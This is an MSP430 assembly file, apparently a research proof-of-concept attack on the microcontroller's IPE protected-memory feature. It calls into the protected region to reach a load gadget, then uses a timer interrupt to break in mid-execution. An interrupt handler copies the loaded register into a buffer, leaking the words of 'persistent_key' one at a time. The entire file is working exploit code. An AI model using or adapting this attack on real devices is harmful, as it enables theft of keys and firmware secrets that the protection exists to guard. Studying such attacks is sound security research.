    .global make_steal_gadget
    .global attest
    .global persistent_key
    .global buffer
    .global use_gadget
    .global TA0CTL
    .global TA0CCR0
    .global fram_ipe_end

    .sect ".gadg_buf"
buffer:
    .space 20
count:
    .word 0
ssp:
    .word 0

    .sect ".make_steal_gadget_code"
make_steal_gadget:
    mov SP,r4
    mova #fram_ipe_end-4,SP
    calla #0x602e
    mov r4,SP ; address should be 0x4F2C = MOV (r15),r12
    reta

    .sect ".gadg_buf"
use_gadget:
    mov #0x0,r5
    mov sp, &ssp
begin_loop: ; r5 is loop variable
    nop
    eint
    nop

    cmp #0x5, &count
    jge end

    mov #persistent_key,r15
    add &count,r15
    add &count,r15
    mov #0x4, &TA0CTL
    mov #0x10, &TA0CCR0
    mov #0x216, &TA0CTL
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop

    call #fram_ipe_end-8
end:
    mov &ssp, sp
    reta


isr_ipe:
    mov #0x0, &TA0CTL

    mova #buffer, r15
    add &count, r15
    add &count, r15
    mova r12, 0(r15)
    inc &count

    nop
    eint
    nop
    jmp begin_loop
    nop

    .sect ".int44"
iv_45:
    .word isr_ipe
